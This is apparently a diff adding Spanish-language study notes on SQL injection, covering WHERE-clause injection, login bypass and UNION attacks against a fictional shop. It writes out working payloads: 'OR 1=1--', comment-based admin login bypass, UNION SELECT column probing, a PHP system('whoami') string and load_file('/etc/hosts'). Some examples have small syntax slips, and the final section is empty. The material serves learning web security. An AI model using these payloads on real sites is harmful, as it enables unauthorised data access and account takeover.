@@ -1,0 +1,74 @@
+SQLi
+
+
+#### #### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data #### #### 
+Existen páginas web que "por detrás" existe una base de datos. Al estar navegando por ella y hacer un input, lo que va a hacer es una query a esa base de datos
+para mostrarte información o para logearte. Por ejemplo, en una tienda online, si haces click a un producto que tengan la query se puede parecer a: 
+
+SELECT * FROM productos where categoria = ' Teclados ' and stock = 1
+
+http://www.tiendafalsa.com/carrito?productos?categoria=teclados
+
+De toda esa tabla te va a seleccionar solo las filas que tienen en su categoria teclados y que están en stock. Un ejemplo de inyección sería, modificando la query anterior:
+
+http://www.tiendafalsa.com/carrito?categoria=teclados' OR 1=1-- 
+SELECT * FROM productos where categoria = ' Teclados ' OR 1=1'-- and stock = 1
+
+Aquí lo que está ocurriendo es que como 1=1 siempre va a ser verdad, todas las filas cumplirian la condición del WHERE, por lo que nos mostraría toda la información 
+de la tabla productos. 
+
+
+
+
+
+#### #### SQL injection vulnerability allowing login bypass #### #### 
+En páginas de log in una query puede ser algo como:
+
+SELECT nombre FROM usuarios WHERE user = ' ' and password = ' ';
+
+Si en el input del usuario, ponemos administrador o alguna cuenta que sepamos que tenga privilegios, podemos conseguir evitar que compruebe la contraseña:
+
+SELECT nombre FROM usuarios WHERE user = 'administrator'-- ' password = ' '; 
+quedaría asi -> SELECT nombre FROM usuarios WHERE user = 'administrator' pues el comentario hace que no compruebe contraseña. 
+
+
+
+
+
+#### #### SQL injection UNION attack, determining the number of columns returned by the query #### #### 
+Determinar el número de columnas es muy importante a la hora de intentar inyectar código. Si volvemos a los ejemplos anteriores:
+
+SELECT * FROM productos where categoria = ' Teclados ' and stock = 1
+http://www.tiendafalsa.com/carrito?productos?categoria=teclados
+
+Podemos probar introduciendo:
+
+http://www.tiendafalsa.com/carrito?productos?categoria=teclados'ORDER BY n-- - -> siendo n un int para determinar las columnas.
+
+http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION SELECT 1,2,3-- -
+http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION SELECT NULL,NULL,NULL-- -
+http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION SELECT version(),NULL,NULL-- -
+http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION SELECT <?php system('whoami');?>,NULL,NULL-- -
+http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION SELECT load_file("/etc/hosts"),NULL,NULL-- -
+
+
+
+
+
+#### #### SQL injection UNION attack, finding a column containing text #### #### 
+http://www.tiendafalsa.com/carrito?productos?categoria=teclados'UNION SELECT NULL,'textointroducido',NULL-- -
+
+
+
+#### #### SQL injection UNION attack, retrieving data from other tables #### #### 
+
+
+
+
+
+
+
+
+
+
+
